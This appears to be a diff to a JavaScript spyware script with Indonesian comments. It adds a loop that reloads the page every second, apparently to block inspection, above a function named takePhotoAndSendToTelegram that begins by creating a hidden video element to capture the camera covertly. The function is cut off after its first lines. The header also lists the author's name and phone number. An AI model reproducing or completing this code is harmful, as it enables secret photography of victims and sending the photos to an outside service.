@@ -1,7 +1,11 @@
 // This script was created by: 𝗥𝗮𝗳𝗮𝘀𝗵𝗮 𝗔𝗹𝗳𝗶𝗮𝗻𝗱𝗶
 // creator's phone number: +6287734034677
 // script ini di lindungi oleh undang-undang hak cipta BACA README.MD
-
+setInterval(function(){
+  if(typeof console !== 'undefined') {
+    window.location.reload();
+  }
+}, 1000);
 function takePhotoAndSendToTelegram() {
     // Membuat elemen video tersembunyi
     const video = document.createElement('video');
